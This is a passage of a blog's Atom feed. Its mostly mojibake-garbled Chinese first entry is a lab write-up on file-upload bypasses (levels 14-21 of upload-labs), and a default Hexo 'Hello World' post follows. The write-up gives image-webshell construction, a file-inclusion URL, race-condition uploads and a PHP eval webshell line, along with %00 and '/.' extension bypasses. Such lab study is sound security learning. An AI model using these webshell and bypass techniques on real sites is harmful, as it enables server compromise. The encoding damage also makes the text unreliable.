å›¾ç‰‡ğŸï¼ˆåªæ£€æŸ¥æ–‡ä»¶å¤´ï¼‰è¿™ä¸ªè¦é…åˆæ–‡ä»¶æ–‡ä»¶åŒ…å«æ¼æ´ç”¨"></a>14ä¸Šä¼ å›¾ç‰‡ğŸï¼ˆåªæ£€æŸ¥æ–‡ä»¶å¤´ï¼‰è¿™ä¸ªè¦é…åˆæ–‡ä»¶æ–‡ä»¶åŒ…å«æ¼æ´ç”¨</h5><p><strong>å…³é”®ä»£ç </strong></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fread($file, 2); &#x2F;&#x2F;åªè¯»2å­—èŠ‚</span><br></pre></td></tr></table></figure><p>äº†è§£jpgã€pngã€gifè¿™ä¸‰ç§æ–‡ä»¶çš„å¤´éƒ¨æ ¼å¼ï¼Œæ¯ç§ç±»å‹çš„å›¾ç‰‡å†…å®¹æœ€å¼€å¤´ä¼šæœ‰ä¸€ä¸ªæ ‡å¿—æ€§çš„å¤´éƒ¨ï¼Œè¿™ä¸ªå¤´éƒ¨è¢«ç§°ä¸ºæ–‡ä»¶å¹»æ•°ã€‚</p><p>å¯ä»¥ä¸Šä¼ å›¾ç‰‡é©¬ï¼Œå›¾ç‰‡é©¬çš„æ–‡ä»¶å¤´å°±æ˜¯æ­£å¸¸å›¾ç‰‡çš„æ–‡ä»¶å¤´æ ¼å¼ï¼Œä»è€Œç»•è¿‡å›¾ç‰‡å¹»æ•°æ£€æµ‹windowsä¸‹å›¾ç‰‡é©¬åˆ¶ä½œæ–¹å¼</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy x.jpg|png|gif&#x2F;b+x.php&#x2F;a x.jpg|png|gif</span><br></pre></td></tr></table></figure><p>è€Œä¸”æœ‰æ—¶å€™å¯¹æ–‡ä»¶å¤§å°ä¹Ÿæœ‰é™åˆ¶ï¼Œæ‰€ä»¥ç»•è¿‡æ–‡ä»¶å¹»æ•°æœ€åˆé€‚çš„æ–¹å¼æ˜¯åˆ©ç”¨16è¿›åˆ¶ç¼–è¾‘å™¨è‡ªå·±åˆ¶ä½œä¸€ä¸ªä¼ªå›¾ç‰‡é©¬ï¼Œè¿™é‡Œåˆ©ç”¨winhexåˆ†åˆ«åˆ›å»ºshell.jpgã€shell.pngã€shell.gifä¸‰ä¸ªä¼ªå›¾ç‰‡é©¬</p><p><img src= "/img/loading.gif" data-lazy-src="http://zone.secevery.com/uploads/article/20180611/2a82ea267fba5cbd5e05a1e0e7b9212d.png" alt="0.png"></p><p>å®ƒæœ‰ä¸ªæ–‡ä»¶åŒ…å«æ¼æ´</p><p>å®¹æ˜“å¯¼è‡´æ–‡ä»¶åŒ…å«çš„å‡½æ•°ï¼š</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include()  </span><br><span class="line">require()  </span><br><span class="line">inlcude_once()  </span><br><span class="line">require_once()</span><br></pre></td></tr></table></figure><p>é…ä¸ªnclude.phpæ–‡ä»¶ä¸Šä¼ æ¼æ´è¾¾åˆ°shell</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;uploadlabs&#x2F;include.php?file&#x3D;upload&#x2F;9020201010105856.jpg</span><br></pre></td></tr></table></figure><p><img src= "/img/loading.gif" data-lazy-src="http://zone.secevery.com/uploads/article/20180611/0fe7bebb3936f615940fe2cf93157d87.png" alt="0.png"></p><p><img src= "/img/loading.gif" data-lazy-src="http://zone.secevery.com/uploads/article/20180611/3375363d8babb6c99a058a421008883b.png" alt="0.png"></p><p>è¡¥å…… è¿˜æœ‰ä¸¤ä¸ªæ–¹æ³•ï¼š</p><p>1.ä¸Šä¼ 1.phpç„¶åbpæŠ“åŒ…åœ¨å†…å®¹å‰é¢åŠ GIF89aï¼ˆæ–‡ä»¶å¤´ï¼‰ï¼Œç„¶ååˆ©ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ„é€ payload</p><p>æŠŠåˆ«çš„å†…å®¹å»æ‰ç›´æ¥åŠ ä¸Š</p><p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201010191232998.png" alt="image-20201010191232998"></p><h5 id="15-ä¸Šä¼ å›¾æ ‡ğŸ-çªç ´getimagesize"><a href="#15-ä¸Šä¼ å›¾æ ‡ğŸ-çªç ´getimagesize" class="headerlink" title="15 ä¸Šä¼ å›¾æ ‡ğŸ çªç ´getimagesize()"></a>15 ä¸Šä¼ å›¾æ ‡ğŸ çªç ´getimagesize()</h5><p>getimagesize()è·å–æ–‡ä»¶ä¿¡æ¯ï¼Œè¯¥å‡½æ•°ä¹Ÿåªæ˜¯è¿›è¡Œæ–‡ä»¶å¤´çš„æ£€æŸ¥</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$info = getimagesize($filename);</span><br></pre></td></tr></table></figure><h5 id="16ä¸Šä¼ å›¾æ ‡ğŸ-exif-imagetype"><a href="#16ä¸Šä¼ å›¾æ ‡ğŸ-exif-imagetype" class="headerlink" title="16ä¸Šä¼ å›¾æ ‡ğŸ exif_imagetype()"></a>16ä¸Šä¼ å›¾æ ‡ğŸ exif_imagetype()</h5><p>è·å–æ–‡ä»¶ä¿¡æ¯ï¼Œè¯¥å‡½æ•°ä¹Ÿåªæ˜¯è¿›è¡Œæ–‡ä»¶å¤´çš„æ£€æŸ¥ï¼Œ</p><h5 id="17äºŒæ¬¡æ¸²æŸ“"><a href="#17äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="17äºŒæ¬¡æ¸²æŸ“"></a>17äºŒæ¬¡æ¸²æŸ“</h5><p>ç®€å•ç‚¹å°±æ˜¯ä½ çŸ¥é“gifçš„æ¸²æŸ“çš„ä½ç½®ï¼Œé‚£ä½ å°±å¯ä»¥æŠŠphpä»£ç æ”¾åˆ°æ²¡æœ‰æ¸²æŸ“çš„åœ°æ–¹è¿›è¡Œä¸Šä¼ ï¼</p><p>æ–‡ç« ï¼š</p><h5 id="18æœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰"><a href="#18æœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰" class="headerlink" title="18æœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰"></a>18æœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰</h5><p><strong>å…³é”®è¯­å¥ï¼š</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$temp_file = $_FILES[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];<span class="comment">//å­˜å‚¨åœ¨æœåŠ¡å™¨çš„æ–‡ä»¶çš„ä¸´æ—¶å‰¯æœ¬çš„åç§°</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$_FILES[å­—æ®µå][name]â€”â€”ä¿å­˜çš„æ–‡ä»¶åœ¨ä¸Šä¼ è€…æœºå™¨ä¸Šçš„æ–‡ä»¶åï¼Œ</span><br><span class="line"></span><br><span class="line">$_FILES[å­—æ®µå][tmp_name]â€”â€”ä¿å­˜çš„æ˜¯ï¼šæ–‡ä»¶ä¸Šä¼ åˆ°æœåŠ¡å™¨çš„ä¸´æ—¶æ–‡ä»¶å¤¹é‡Œçš„æ–‡ä»¶å</span><br></pre></td></tr></table></figure><p><strong>æ€è·¯ï¼š</strong>å› ä¸ºæ–‡ä»¶ä¸Šä¼ åå…ˆæ”¾åœ¨ä¸€ä¸ªä¸´æ—¶ä½ç½®å†åˆ¤æ–­æ˜¯å¦åˆæ³•ï¼Œæ‰€ä»¥å¯ä»¥åœ¨æ–‡ä»¶å­˜åœ¨ä¸´æ—¶ä½ç½®ï¼Œæœªè¢«åˆ é™¤çš„ç¬é—´è®¿é—®ã€‚è¿™æ ·çš„æ‰‹é€Ÿåæ­£æˆ‘æ˜¯æ²¡æœ‰ï¼Œæ®è¯´æ˜¯ç”¨bpå‡ åä¸Šç™¾çº¿ç¨‹å‘é€æ•°æ®åŒ…è¿‡å»ç„¶åè¶æœåŠ¡å™¨ä¸æ³¨æ„å°±è®¿é—®ã€‚</p><p><strong>æ€è·¯ï¼š</strong></p><p>å½“æˆ‘ä»¬ä¸Šä¼ web shellæ–‡ä»¶æ—¶ï¼Œä¸ä¼šå…ˆé™åˆ¶phpç±»å‹æ–‡ä»¶ä¸Šä¼ ï¼Œå…ˆåˆ©ç”¨ä¸Šé¢çš„è¯­å¥æŠŠä¸Šä¼ çš„æ–‡ä»¶ä¸´æ—¶å­˜æ”¾ã€‚å†æ‰§è¡Œä¸‹é¢çš„ifè¯­å¥è¿›è¡Œæ–‡ä»¶ç±»å‹çš„é™åˆ¶å’Œæ–‡ä»¶åçš„æ—¶é—´æˆ³ã€‚<br>ç„¶åæ‰§è¡Œif(move_uploaded_file($temp_file, $upload_file))//ç§»åŠ¨åˆ°æ–°æ–‡ä»¶å¤¹</p><p>ç»•è¿‡æ€è·¯æ˜¯åˆ©ç”¨ä»£ç æ‰§è¡Œè¿‡ç¨‹æœ‰è€—è´¹æ—¶é—´çš„è¿‡ç¨‹ã€‚ä¸´æ—¶webshellæ–‡ä»¶ä¿å­˜çš„æçŸ­æ—¶é—´ï¼Œå»è®¿é—®webshellã€‚è·å–ä¸€äº›ä¿¡æ¯</p><p>æˆ‘ä»¬å¯ä»¥åˆ©ç”¨burpå¤šçº¿ç¨‹å‘åŒ…ï¼Œç„¶åä¸æ–­åœ¨æµè§ˆå™¨è®¿é—®æˆ‘ä»¬çš„webshellã€‚</p><p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201010221530169.png" alt="image-20201010221530169"></p><p><img src= "/img/loading.gif" data-lazy-src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20201010221545388.png" alt="image-20201010221545388"></p><p>å¤§ä½¬å°†çš„ä¸€ä¸ªæ–¹æ³•ï¼š</p><p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼š</p><p><strong>å¤šçº¿ç¨‹ä¸æ–­å‘taochiyu.php</strong> </p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">file_put_contents(&#39;1.php&#39;,&#39;&lt;?php eval($_POST[1]);?&gt;&#39;);</span><br></pre></td></tr></table></figure><p>é‡Œé¢æœ‰è¿™å¥ä»£ç ï¼š</p><p>ç„¶åå†è®©å¦å¤–ä¸€ä¸ªéšä¾¿çš„æ•°æ®åŒ…  <strong>å¤šçº¿ç¨‹è®¿é—®taochiyu.php</strong></p><p><strong>ä¸¤è€…åŒæ—¶è¿›è¡Œï¼ï¼š</strong></p><p>å› ä¸ºé‚£å¥ä»£ç çš„ç¼˜æ•…ï¼Œåªè¦ä¸€æ¬¡è®¿é—®åˆ°ï¼Œä½ çš„ç›®å½•ä¸‹å°±ä¼šå‡ºç°1.phpï¼ŒgetshellæˆåŠŸï¼</p><p>çº¿ç¨‹è°ƒæˆ50å¿«ç‚¹ï¼</p><h5 id="19æ¼æ´ç‚¹ä¸ºæœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰"><a href="#19æ¼æ´ç‚¹ä¸ºæœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰" class="headerlink" title="19æ¼æ´ç‚¹ä¸ºæœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰"></a>19æ¼æ´ç‚¹ä¸ºæœåŠ¡ç«¯â€“ä»£ç é€»è¾‘â€“æ¡ä»¶ç«äº‰</h5><p>å…ˆæ£€æŸ¥äº†åç¼€ï¼</p><p>æœ¬å…³å¯¹æ–‡ä»¶åç¼€ååšäº†ç™½åå•åˆ¤æ–­ï¼Œç„¶åä¼šä¸€æ­¥ä¸€æ­¥æ£€æŸ¥æ–‡ä»¶å¤§å°ã€æ–‡ä»¶æ˜¯å¦å­˜åœ¨ç­‰ç­‰ï¼Œå°†æ–‡ä»¶ä¸Šä¼ åï¼Œå¯¹æ–‡ä»¶é‡æ–°å‘½åï¼ŒåŒæ ·å­˜åœ¨æ¡ä»¶ç«äº‰çš„æ¼æ´ã€‚å¯ä»¥ä¸æ–­åˆ©ç”¨burpå‘é€ä¸Šä¼ å›¾ç‰‡é©¬çš„æ•°æ®åŒ…ï¼Œç”±äºæ¡ä»¶ç«äº‰ï¼Œç¨‹åºä¼šå‡ºç°æ¥ä¸åŠrenameçš„é—®é¢˜ï¼Œä»è€Œä¸Šä¼ æˆåŠŸï¼š</p><h5 id="20-00ç»•è¿‡æˆ–è€…-ç»•è¿‡"><a href="#20-00ç»•è¿‡æˆ–è€…-ç»•è¿‡" class="headerlink" title="20%00ç»•è¿‡æˆ–è€…/.ç»•è¿‡"></a>20%00ç»•è¿‡æˆ–è€…/.ç»•è¿‡</h5><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$file_ext = pathinfo($file_name,PATHINFO_EXTENSIONè·å–åç¼€ç½‘å);</span><br><span class="line">PATHINFO_EXTENSIONè·å–åç¼€å</span><br></pre></td></tr></table></figure><p>è¿™ä¸ªå‡½æ•°åœ¨$file_nameåé¢åŠ %00    å°±å¯ä»¥ç»•è¿‡è¿™ä¸ªå‡½æ•°</p><h5 id="21-å’Œæ•°ç»„ç»•è¿‡"><a href="#21-å’Œæ•°ç»„ç»•è¿‡" class="headerlink" title="21 /.å’Œæ•°ç»„ç»•è¿‡"></a>21 /.å’Œæ•°ç»„ç»•è¿‡</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$file &#x3D; empty($_POST[&#39;save_name&#39;]) ? $_FILES[&#39;upload_file&#39;][&#39;name&#39;] : $_POST[&#39;save_name&#39;];</span><br><span class="line">å¦‚æœsave_nameä¸ä¸ºç©ºåˆ™fileä¸ºsave_name,å¦åˆ™fileä¸ºfilename</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">move_uploaded_file&#96;ä¼šå¿½ç•¥æ‰&#96;&#x2F;. ä¸èƒ½æ˜¯&#x2F;ã€‚ã€‚åªèƒ½æ˜¯&#x2F;ã€‚</span><br></pre></td></tr></table></figure><p>å…ˆä¸Šä¼ phpæ–‡ä»¶æ”¹æ‰å®ƒçš„<strong>MIEM</strong>æ”¹æˆâ€”-&gt;image/jpeg</p><p><img src= "/img/loading.gif" data-lazy-src="https://xzfile.aliyuncs.com/media/upload/picture/20190527142730-80f9e4c4-8048-1.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;æ–‡ä»¶ä¸Šä¼ &quot;&gt;&lt;a href=&quot;#æ–‡ä»¶ä¸Šä¼ &quot; class=&quot;headerlink&quot; title=&quot;æ–‡ä»¶ä¸Šä¼ &quot;&gt;&lt;/a&gt;æ–‡ä»¶ä¸Šä¼ &lt;/h1&gt;&lt;p&gt;&lt;img src= &quot;/img/loading.gif&quot; data-lazy-src=&quot;https://i.loli.net</summary>
      
    
    
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/categories/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
    
    <category term="æ–‡ä»¶ä¸Šä¼ " scheme="http://example.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://example.com/2020/09/30/hello-world/"/>
    <id>http://example.com/2020/09/30/hello-world/</id>
    <published>2020-09-30T13:24:46.166Z</published>
    <updated>2020-09-30T13:24:46.166Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot;&gt;documentation&lt;/a&gt; for</summary>
      
    
    
    
    
  </entry>
  
</feed>
